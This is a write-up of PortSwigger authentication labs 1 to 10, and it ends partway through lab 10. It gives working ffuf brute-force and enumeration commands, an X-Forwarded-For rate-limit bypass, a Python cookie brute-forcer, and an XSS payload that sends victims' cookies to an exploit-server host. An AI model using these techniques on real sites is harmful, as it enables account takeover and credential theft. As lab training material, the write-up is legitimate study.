---
created: 2026-04-30
tags:
  - walkthrough
---

>[!note]+ Labs are numbered as per order in [the list of Authentication injection labs](https://portswigger.net/web-security/all-labs#authentication).

| `#`   | Solved?         | Name                                                |
| ----- | --------------- | --------------------------------------------------- |
| `1.`  | [`✓`]()         | Username enumeration via different responses        |
| `2.`  | `✓`             | 2FA simple bypass                                   |
| `3.`  | `✓`             | Password reset broken logic                         |
| `4.`  | `✓`             | Username enumeration via subtly different responses |
| `5.`  | `✓`             | Username enumeration via response timing            |
| `6.`  | `✓`             | Broken brute-force protection, IP block             |
| `7.`  | `✓` solve again | Username enumeration via account lock               |
| `8.`  | `✓`             | 2FA broken logic                                    |
| `9.`  | `✓`             | Brute-forcing a stay-logged-in cookie               |
| `10.` | `✓`             | Offline password cracking                           |
| `11.` | `✓`             | Password reset poisoning via middleware             |
| `12.` | `✓`             | Password brute-force via password change            |


## 1. Username enumeration via different responses

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Username enumeration via different responses`](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
> - Level: #Apprentice 
> 
> This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> 
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
### Solution 

- First copy usernames to `users.txt` and passwords to `passwords.txt` files.

- First, attempt to log in to watch how the application behaves:

![[images/walkthrough/PortSwigger/Authentication/lab1/1.png]]

- When username is invalid, the application tells you directly with `Invalid username` message.
- You can use that to enumerate usernames:

```bash
ffuf -u https://0ac2002d03088048966887ea00900034.web-security-academy.net/login \
	-w users.txt \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=FUZZ&password=invalid" \
	-c -ic -ac -s
```
```
ajax
```

- Now, attempting to log in with a valid username gives `Incorrect password` in response:


![[images/walkthrough/PortSwigger/Authentication/lab1/2.png]]


- To brute-force password, slightly modify the command:

```bash
ffuf -u https://0ac2002d03088048966887ea00900034.web-security-academy.net/login \
	-w passwords.txt \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=ajax&password=FUZZ" \
	-c -ic -ac -s
```
```
2000
```

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/Authentication/lab1/solved.png]]


Solved!
## 2. 2FA simple bypass

>[!done]

>[!note]+ Lab description
> - [`Lab: 2FA simple bypass`](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
> - Level: #Apprentice 
> 
> This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
> 
> - Your credentials: `wiener:peter`
> - Victim's credentials `carlos:montoya`

### Solution

- First, walk through the 2FA process using the given credentials to learn how it works:

![[images/walkthrough/PortSwigger/Authentication/lab2/1.png]]

- The application asks you to enter a 4-digit security code sent to email:

![[2.png]]

- You receive the code via email client:

![[images/walkthrough/PortSwigger/Authentication/lab2/3.png]]

- Copy it and enter to the field. You are logged in:

![[images/walkthrough/PortSwigger/Authentication/lab2/4.png]]

- In Burp, the process looks like this:

![[images/walkthrough/PortSwigger/Authentication/lab2/5.png]]

This is a multi-stage process. In an attempt to bypass MFA, you can try skipping one of the stages.

- Originally, in response to correct username, password pair, the application redirects to `/login2`:

![[images/walkthrough/PortSwigger/Authentication/lab2/6.png]]

- The developers direct the user to the next stage, so that they have an illusion that all stages are required. But it doesn't necessarily mean that. The security code might not be checked at all, and you might be able to just to `/my-account?id=wiener` right after `/login`.
- To check, log out, and then log in again, but this time, instead of entering the code, navigate straight to `/my-account?id=wiener`.
- This works. Here is how it looks like in Burp:

![[images/walkthrough/PortSwigger/Authentication/lab2/7.png]]

No security code was submitted to `/login2` via `POST`, and yet we still have access to the account.


- Do the same with `carlos` — navigate to `/my-account?id=carlos` right after entering credentials at `/login` — and you're in:

![[images/walkthrough/PortSwigger/Authentication/lab2/solved.png]]

## 3. Password reset broken logic

>[!done]

>[!note]+ Lab description
> - [`Lab: Password reset broken logic`](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
> - Level: #Apprentice 
> 
> This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`

### Solution

- First, log in with the given credentials to discover how the process works:

![[images/walkthrough/PortSwigger/Authentication/lab3/1.png]]

- Log out and try `Forgot password` functionality:

![[images/walkthrough/PortSwigger/Authentication/lab3/2.png]]

- In the email field, paste the email from your account:

![[images/walkthrough/PortSwigger/Authentication/lab3/3.png]]

- In the email client, find the email and click the link:

![[images/walkthrough/PortSwigger/Authentication/lab3/4.png]]

- You will see a window where you can change password:

![[images/walkthrough/PortSwigger/Authentication/lab3/5.png]]

- In Burp, the process looks like this:

![[images/walkthrough/PortSwigger/Authentication/lab3/6.png]]

- You notice that the actual password reset request includes the target username. So what if the application doesn't tie to to the session ID, and just trusts? In this case, you could change anyone's password just by changing the username parameter.

- Actually, if you send **the same request** to `Repeater`, just change `username` from `wiener` to `carlos`, **it will change `carlos`'s password**. So the application doesn't even invalidate temporary forgot password token, which means it's not actually temporary.

![[images/walkthrough/PortSwigger/Authentication/lab3/7.png]]

- Log in as `carlos` using this password you set:

![[images/walkthrough/PortSwigger/Authentication/lab3/solved.png]]
## 4. Username enumeration via subtly different responses

>[!done]

>[!note]+ Lab description
> - [`Lab: Username enumeration via subtly different responses`](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)
> - Level: #Practitioner 
> 
> This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> 
> - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> 
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Solution

- First copy usernames to `users.txt` and passwords to `passwords.txt` files.
- Then try to log in with arbitrary credentials. 
- This time, the application doesn't give an obvious answer on what was wrong: username or password, and responds with the generic `Invalid username or password.`:

![[images/walkthrough/PortSwigger/Authentication/lab4/1.png]]


- In this case, you still can try to enumerate usernames. Run `ffuf` and filter out the exact `Invalid username or password.` message:

```bash
ffuf -u https://0a2600ce035a66e782ca0136002200a5.web-security-academy.net/login \
	-w users.txt \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=FUZZ&password=invalid" \
	-fr "Invalid username or password\." \
	-c -ic -s
```
```bash
guest
```

What you see is the response that didn't have the exact error like you filtered. If you try to log in with it, you'll see that the message is the same, but the period at the end is missing:

![[images/walkthrough/PortSwigger/Authentication/lab4/2.png]]

Although it doesn't tell you directly that the username is valid, since the response stands out of the majority, it is likely is valid.

- To brute-force password:

```bash
ffuf -u https://0a2600ce035a66e782ca0136002200a5.web-security-academy.net/login \
	-w passwords.txt \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=guest&password=FUZZ" \
	-fr "Invalid username or password\." \
	-c -ic -ac -mc all
```

- In the results you'll see one with a different HTTP response code:

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0a2600ce035a66e782ca0136002200a5.web-security-academy.net/login
 :: Wordlist         : FUZZ: /home/htb-ac-1908986/passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=guest&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Invalid username or password\.
________________________________________________

1234                    [Status: 200, Size: 3336, Words: 1336, Lines: 69, Duration: 19ms]
1234567890              [Status: 200, Size: 3338, Words: 1336, Lines: 69, Duration: 19ms]
<SNIP>
1qaz2wsx                [Status: 200, Size: 3336, Words: 1336, Lines: 69, Duration: 26ms]
letmein                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
killer                  [Status: 200, Size: 3339, Words: 1336, Lines: 69, Duration: 20ms]
<SNIP>
monitoring              [Status: 200, Size: 3338, Words: 1336, Lines: 69, Duration: 33ms]
:: Progress: [100/100] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

- Check using `curl`:

```bash
curl https://0a2600ce035a66e782ca0136002200a5.web-security-academy.net/login \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=guest&password=letmein" \
	-v 
```

```bash
<SNIP>
< HTTP/2 302 
< location: /my-account?id=guest
< set-cookie: session=CVpxdE9yTZMXIY15ZrgnYwjOlklP3B61; Secure; HttpOnly; SameSite=None
< x-frame-options: SAMEORIGIN
< content-length: 0
<SNIP>
```

This is the redirect to the `guest` account, which means the credentials are valid. 

- Log in with the discovered credentials in browser normally:

![[images/walkthrough/PortSwigger/Authentication/lab4/solved.png]]

Solved!
## 5. Username enumeration via response timing

>[!done]

>[!note]+ Lab description
> - [`Lab: Username enumeration via response timing`](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
> - Level: #Practitioner 
> 
> This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> -  Your credentials: `wiener:peter`
> - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> 
### Solution

- First copy usernames to `users.txt` and passwords to `passwords.txt` files.

- Attempt to log in with arbitrary credentials:

![[images/walkthrough/PortSwigger/Authentication/lab5/1.png]]

- The response is generic again.
- After `n` tries, you see an error message. After that, the application doesn't show ig your credentials are invalid:

```bash
You have made too many incorrect login attempts. Please try again in 30 minute(s).
```

![[images/walkthrough/PortSwigger/Authentication/lab5/2.png]]

- The most basic `X-Forwarded-For` trick works well to solve the issue:

```HTTP
username=anything&password=invalid
```

![[images/walkthrough/PortSwigger/Authentication/lab5/3.png]]

- Enter the given valid username to see if there's any difference:

![[images/walkthrough/PortSwigger/Authentication/lab5/4.png]]

- The only thing that changes is timing. With invalid username, it was just `23` milliseconds, with valid — `73`.

- To ensure it's not caching to blame in short response timing, add arbitrary cookie or URL parameters the target application won't notice but the cache would include in its cache key (if you can find such):

![[images/walkthrough/PortSwigger/Authentication/lab5/5.png]]


- Still `22`-`23` milliseconds — it's not cache. This is crackable. 

- Generate a sequence of numbers from, say, `100` to `205` — we'll use it for `X-Forwarded-For` (there are only `101` username, for more you'd use more numbers)

```bash
seq 100 205 > numbers.txt
```

- Then enumerate usernames using `ffuf`:

```bash
ffuf -u https://0aed00a003b819e681a90cfa006700b4.web-security-academy.net/login \
	-X POST \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-H "X-Forwarded-For: 127.0.0.IPZZ" \
	-d "username=USERZZ&password=invalid" \
	-w numbers.txt:IPZZ \
	-w users.txt:USERZZ \
	-t 1 -p 0.2 \
	-mode pitchfork \
	-ft "<30" \
	-c -ic -mc all
```

- `-ft` filters out responses that took less than `30` milliseconds to arrive.
- `-t` forces `ffuf` to use only one thread, so that requests aren't sent in parallel — this is mostly for accuracy. I added `-p` to not DoS the poor lab accidentally (yes I did it once already).

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0aed00a003b819e681a90cfa006700b4.web-security-academy.net/login
 :: Wordlist         : IPZZ: /home/htb-ac-1908986/numbers.txt
 :: Wordlist         : USERZZ: /home/htb-ac-1908986/users.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : X-Forwarded-For: 127.0.0.IPZZ
 :: Data             : username=USERZZ&password=invalid
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Delay            : 0.20 seconds
 :: Matcher          : Response status: all
 :: Filter           : Response time: <30
________________________________________________

[Status: 200, Size: 3245, Words: 1325, Lines: 68, Duration: 56ms]
    * IPZZ: 141
    * USERZZ: afiliados

[Status: 200, Size: 3245, Words: 1325, Lines: 68, Duration: 92ms]
    * IPZZ: 165
    * USERZZ: antivirus
```

- Two usernames; this probably happened because of network jitter. I started with the one that took longer — `antivirus`. Found no usernames, then tried `afiliados`, and go this:

```bash
ffuf -u https://0aed00a003b819e681a90cfa006700b4.web-security-academy.net/login \
	-X POST \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-H "X-Forwarded-For: 127.0.0.IPZZ" \
	-d "username=afiliados&password=PASSZZ" \
	-w numbers.txt:IPZZ \
	-w passwords.txt:PASSZZ \
	-t 1 -p 0.2 \
	-mode pitchfork \
	-c -ic -fc 200
```


```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0aed00a003b819e681a90cfa006700b4.web-security-academy.net/login
 :: Wordlist         : IPZZ: /home/htb-ac-1908986/numbers.txt
 :: Wordlist         : PASSZZ: /home/htb-ac-1908986/passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : X-Forwarded-For: 127.0.1.IPZZ
 :: Data             : username=afiliados&password=PASSZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Delay            : 0.20 seconds
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
    * IPZZ: 173
    * PASSZZ: ginger

:: Progress: [106/106] :: Job [1/1] :: 3 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/Authentication/lab5/solved.png]]

Solved!
## 6. Broken brute-force protection, IP block

>[!done]

>[!note]+ Lab description
> - [`Lab: Broken brute-force protection, IP block`](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
> - Level: #Practitioner 
> 
> This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

### Solution

- Copy passwords to `passwords.txt`.
- First, try to submit invalid credentials to the password form:

![[images/walkthrough/PortSwigger/Authentication/lab6/1.png]]

- The application says `Incorrect password`. 
- Repeat the request several times to test for rate-limiting. After the 3rd incorrect attempt, the application says:

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

![[images/walkthrough/PortSwigger/Authentication/lab6/2.png]]

The lab deliberately reduced account lockout time so we don't have to wait for ages to solve this.

Try a common bypass, add an `X-Forwareded-For` header:

```HTTP
X-Forwarded-For: 127.0.0.1
```

Doesn't work. The message doesn't disappear, locking is still in place. 

It turns out that if you log in with your credentials after a series of unsuccessful attempts *but before the lockout*, the lockout counter resets.

- Before the lockout applies, you can make three incorrect attempts.
- This means that, to bypass the protection and brute-force `carlos`'s password, you need:
	- Submit two password guesses for `carlos` in a row
	- Then submit one login attempt with your valid credentials
	- Repeat until the password is guessed

- The easiest way is to transform the password wordlist this way:

```bash
awk '{print; if (NR % 2 == 0) print "peter"}' passwords.txt > peter_passwords.txt
```

```bash
head peter_passwords.txt
```

```bash
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
... 
```

- Calculate lines:

```bash
wc -l peter_passwords.txt
```

```bash
150 peter_passwords.txt
```

- Then compose `wiener_users.txt` like this:

```bash
awk 'BEGIN { for (i=1; i<=150; i++) print (i % 3 ? "carlos" : "wiener") }' > wiener_users.txt
```

```bash
head wiener_users.txt
```
```bash
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
...
```

- And then use Pitchfork in `ffuf`:

```bash
ffuf -u https://0a430062047b161380f976fa00b7000c.web-security-academy.net/login \
	-X POST \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-d "username=USER&password=PASS" \
	-w wiener_users.txt:USER \
	-w peter_passwords.txt:PASS \
	-t 1 -p 0.2 \
	-mode pitchfork \
	-c 
```

- Test if the attack works as needed: two `carlos` login attempts, one valid `wiener`:

![[images/walkthrough/PortSwigger/Authentication/lab6/3.png]]

- Then start the attack again, this time match codes `302`:

```bash
ffuf -u https://0a430062047b161380f976fa00b7000c.web-security-academy.net/login \
	-X POST \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-d "username=USER&password=PASS" \
	-w wiener_users.txt:USER \
	-w peter_passwords.txt:PASS \
	-t 1 -p 0.05 \
	-mode pitchfork \
	-c -mc 302
```

- In the output, find `carlos`'s valid login:

![[images/walkthrough/PortSwigger/Authentication/lab6/4.png]]

- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/Authentication/lab6/solved.png]]

Solved!
## 7. Username enumeration via account lock

>[!done]

>[!note]+ Lab description
> - [`Lab: Username enumeration via account lock`](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
> - Level: #Practitioner 
> 
> This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> 
> - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

### Solution

- First copy usernames to `users.txt` and passwords to `passwords.txt` files.

- This time, it's given that several login attempts with invalid password but valid username invokes account lockout. 
- No matter how many login attempts you send for an invalid username, the application will still respond with a generic message:

![[images/walkthrough/PortSwigger/Authentication/lab7/1.png]]

- Normally, you'd discover that fact using a valid account, but it's not given in the lab.
- Typically lockout activates after 3 or 5 invalid login attempts. So, we should send 6 invalid attempts, and see if the 6th is any different in length. If yes — this means the message had changed and the lockout is in place. If not, the username is invalid and the application just repeats the same error.
- To test it using `ffuf` without complex loops, just multiply each username in the wordlist 6 times:

```bash
awk '{for(i=0;i<6;i++) print}' input.txt > users6.txt
```

- Then start ffuf, find out the most common length, and filter it out:

```bash
ffuf -u https://0aa800ec032af13181ce207a00ee00b6.web-security-academy.net/login \
	-w users6.txt \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-X POST -d "username=FUZZ&password=invalid" \
	-c -ic -fs 3236 -s
```
```
adserver
```

- The result is the (hopefully) valid username.
- Check it in Burp:

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

![[images/walkthrough/PortSwigger/Authentication/lab7/2.png]]

The lab deliberately reduced account lockout time so we don't have to wait for ages to solve this.

- Then try password brute-force. It turns out that the lockout itself has a flaw. 
- Observe the responses and identify the shortest one — with no error message:

```bash
ffuf -u https://0aa800ec032af13181ce207a00ee00b6.web-security-academy.net/login \
	-X POST \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-H "X-Forwarded-For: 127.0.0.IPZZ" \
	-d "username=adserver&password=PASSZZ" \
	-w numbers.txt:IPZZ \
	-w passwords.txt:PASSZZ \
	-t 1 -p 0.2 \
	-mode pitchfork \
	-c -ic -fc 200
```

```bash
<SNIP>
[Status: 200, Size: 3288, Words: 1335, Lines: 68, Duration: 19ms]
    * IPZZ: 125
    * PASSZZ: superman

[Status: 200, Size: 3288, Words: 1335, Lines: 68, Duration: 19ms]
    * IPZZ: 126
    * PASSZZ: 1qaz2wsx

[Status: 200, Size: 3158, Words: 1297, Lines: 67, Duration: 20ms]
    * IPZZ: 127
    * PASSZZ: 7777777

[Status: 200, Size: 3288, Words: 1335, Lines: 68, Duration: 20ms]
    * IPZZ: 128
    * PASSZZ: 121212

[Status: 200, Size: 3288, Words: 1335, Lines: 68, Duration: 19ms]
<SNIP>
```

- This is likely the valid password. Wait for the lockout and attempt to log in with it:

![[images/walkthrough/PortSwigger/Authentication/lab7/solved.png]]

Solved!
## 8. 2FA broken logic 

>[!done]

>[!note]+ Lab description
>- [`Lab: 2FA broken logic`](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
>- Level: #Practitioner 
>
This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`
> 
> You also have access to the email server to receive your 2FA verification code.

### Solution

- Walk through the authentication process using your account. Navigate to login and enter credentials:

![[images/walkthrough/PortSwigger/Authentication/lab2/1.png]]

- The application asks you to enter a 4-digit security code sent to email:



- You receive the code via email client:

![[images/walkthrough/PortSwigger/Authentication/lab8/1.png]]

- Copy it and enter to the field. You are logged in:

![[images/walkthrough/PortSwigger/Authentication/lab8/2.png]]

- In Burp, it looks like this:

![[images/walkthrough/PortSwigger/Authentication/lab8/3.png]]

- Notice that in response to valid credentials submitted to `/login`, the application sets a cookie: `verify=wiener`. 
- This cookie is then sent with the `POST` request to `/login2`, with `mfa-code`:

![[images/walkthrough/PortSwigger/Authentication/lab8/4.png]]

- But what if the application doesn't really verify that this session ID already entered credentials for this particular account, and simply relies of `verify=wiener` cookie?

- Generate `tokens.txt`:

```bash
seq -w 1 9999 > tokens.txt
```

1. Log out.
2. In Burp `HTTP history`, find `GET` to `/login2` and send it to `Repeater`:

![[images/walkthrough/PortSwigger/Authentication/lab8/5.png]]

3. Change `verify=wiener` cookie to `verify=carlos`:

![[images/walkthrough/PortSwigger/Authentication/lab8/6.png]]

4. Then, in history, find `POST` to `/login2` and `Copy as curl command (bash)` (because I'm doing it without Burp Professional; normally you'd `Send to Intruder` and brute-force like a normal human being):

![[images/walkthrough/PortSwigger/Authentication/lab8/7.png]]

5. Transform the `curl` command into `ffuf`  like this:

```bash
ffuf -u 'https://0a74007c03bcc195817a4362001b008c.web-security-academy.net/login2' \
	-X POST -w tokens.txt \
	--data-binary 'mfa-code=FUZZ' \
	-b 'verify=carlos; session=5KcylhYSahS1TFS66n8JMQ8kaz5UNm4n' \
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36' -mc 302
```

6. Then start the attack and watch which code is different. Find `302` (or just filter using `-mc 302`):

![[images/walkthrough/PortSwigger/Authentication/lab8/8.png]]

7. Copy the code. Then send `POST` to `/login2` to `Repeater`, change `verify=wiener` to `verify=carlos`, and paste the code you've found. Then `Send`:

![[images/walkthrough/PortSwigger/Authentication/lab8/9.png]]


8. In the response, you will get the session ID. Copy this value. 
9. Turn on `Intercept` and go to `/my-account?id=carlos`. Intercept the `GET` request, remove `verify=wiener`, and change the session ID to the value you've copied:

![[images/walkthrough/PortSwigger/Authentication/lab8/10.png]]

10. `Send` all requests. 
11. You'll get access to the `carlos`'s account, but your browser cookie is not actually `carlos`'s yet. 
12. Go to Developer Tools (`Ctrl+Shift+I`).
13. Go to `Application` -> `Cookies` -> Lab URL -> `session` cookie -> `Edit "Value"`. Paste the cookie in your clipboard:

![[11.png]]


14. Refresh the page:

![[images/walkthrough/PortSwigger/Authentication/lab8/solved.png]]

Solved!
## 9. Brute-forcing a stay-logged-in cookie

>[!done]

>[!note]+ Lab description
> - [`Lab: Brute-forcing a stay-logged-in cookie`](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
> - Level: #Practitioner 
> 
> This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
> 
> To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

### Solution

- Walk through the login process with your account to see how it works.
- During login, check `Stay logged in`:


![[images/walkthrough/PortSwigger/Authentication/lab9/1.png]]

- In Burp history, the process looks like this:

![[images/walkthrough/PortSwigger/Authentication/lab9/2.png]]

- If you inspect the `stay-logged-in` cookie, you see this:

![[images/walkthrough/PortSwigger/Authentication/lab9/3.png]]


- The cookie is a Base64-encoded version of the following string:

```bash
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

- The second part is `32` characters long, and resembles an MD5 hash.
- Crack it using [`CrackStation`](https://crackstation.net/):

![[images/walkthrough/PortSwigger/Authentication/lab9/4.png]]

- It turns out that the hash is an MD5-encoded password. This means the `stay-logged-in` cookie is non-unique per session.
- To check, log out and log in again:

![[images/walkthrough/PortSwigger/Authentication/lab9/5.png]]

- The cookie is always the same.
- You can use this to brute-force `carlos`'s password.

- This time, `ffuf` is probably not enough. Write a Python script instead:

```Python
import requests
import os
import hashlib
import base64
import colorama

LAB_ID = '0adf000303419d6a8060ad63009100e7'
host = f'{LAB_ID}.web-security-academy.net'
headers = {
	'Host': host,
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
}

colorama.init()

def calculate_stay_logged_in_cookie(username, password):
	"""
	Calculate a string like:
	Base64("username" + ":" + "MD5(password)")
	"""

	# calculate MD5 hash of the password to probe (output is a hex string):
	md5_hash = hashlib.md5(password.encode('utf-8')).hexdigest()
	print(f'{colorama.Fore.WHITE}MD5({password}): {colorama.Fore.BLUE}{md5_hash}')

	# concatenate username and the hash value
	cookie_decoded = f'{username}:{md5_hash}'
	print(f'{colorama.Fore.WHITE}Cookie (decoded): {colorama.Fore.BLUE}{cookie_decoded}')

	# convert the string to bytes for Base64 encoding:
	cookie_bytes = cookie_decoded.encode('utf-8')
	# Base64-encode the result:
	base64_bytes = base64.b64encode(cookie_bytes)
	# convert bytes back to string:
	cookie = base64_bytes.decode('utf-8')
	print(f'{colorama.Fore.WHITE}Stay logged-in cookie: {colorama.Fore.RED}{cookie}')

	return cookie

def request_user_profile(username, cookie, host):
	stay_cookie = {'stay-logged-in': cookie}
	print(stay_cookie)
	url = f'https://{host}/my-account?id={username}'
	print(url)
	response = requests.get(url, cookies=stay_cookie, headers=headers)
	# print(response.text)
	return response


def main():
	username = 'carlos'
	with open('passwords.txt') as f:
		candidate_passwords = [line.strip() for line in f if line.strip()]

	for p in candidate_passwords:
		print(f'Password: {p}')
		cookie = calculate_stay_logged_in_cookie(username, p)
		response = request_user_profile(username, cookie, host)
		if 'My Account' in response.text:
			print(f'{colorama.Fore.GREEN}VALID PASSWORD: {p}{colorama.Fore.WHITE}\nCookie: {cookie}')
			exit()
		else:
			print(f'WRONG PASSWORD\n\n')



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted')
        exit()
```
3
- Run it:

```bash
python script.py
```

- Wait for the valid password in the results:

![[images/walkthrough/PortSwigger/Authentication/lab9/6.png]]


- Alternatively, use `Intruder` with payload processing:

![[images/walkthrough/PortSwigger/Authentication/lab9/7.png]]

- Log in as `carlos` with the discovered password:

![[images/walkthrough/PortSwigger/Authentication/lab9/solved.png]]

Solved!
## 10. Offline password cracking

>[!done]

>[!note]+ Lab description
> - [`Lab: Offline password cracking`](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
> - Level: #Practitioner 
> 
> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`

### Solution

- First, log in with the given credentials to understand how authentication works:

![[images/walkthrough/PortSwigger/Authentication/lab9/1.png]]


- The cookie is the same as before — `Base64(username:MD5(password))`:

![[images/walkthrough/PortSwigger/Authentication/lab10/1.png]]

- Another way to obtain `carlos`'s password rather than simply brute-forcing is to steal their cookie via an XSS (Cross-Site Scripting) vulnerability, if any. 
- The comment functionality has no XSS protection:

![[images/walkthrough/PortSwigger/Authentication/lab10/2.png]]

![[images/walkthrough/PortSwigger/Authentication/lab10/3.png]]

- This lab also provides us with an exploit server. 
- All you have to do to steal the `carlos`'s cookie (the lab guarantees they will navigate to the page where you injected JS), is to post this as a comment:

```HTML
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

```HTML
<script>document.location='//exploit-0aee00df0390d492811b60d4015d0022.exploit-server.net/?cookie='+document.cookie</script>
```

![[images/walkthrough/PortSwigger/Authentication/lab10/4.png]]

Then go to Exploit server -> `Access log`, and see:


![[images/walkthrough/PortSwigger/Authentication/lab10/5.png]]

- Copy the `stay-logged-in` cookie, decode it:

![[images/walkthrough/PortSwigger/Authentication/lab10/6.png]]


- Then go to `CrackStation` and crack the hash:

![[images/walkthrough/PortSwigger/Authentication/lab10/7.png]]

- Copy the password and log in as `carlos` with the discovered password:

![[images/walkthrough/PortSwigger/Authentication/lab10/8.png]]

- To make sure you didn't simply copied the `carlos`'s session cookie to get access to their account without cracking the password, the lab asks you to delete the account, which requires you to enter the password again:

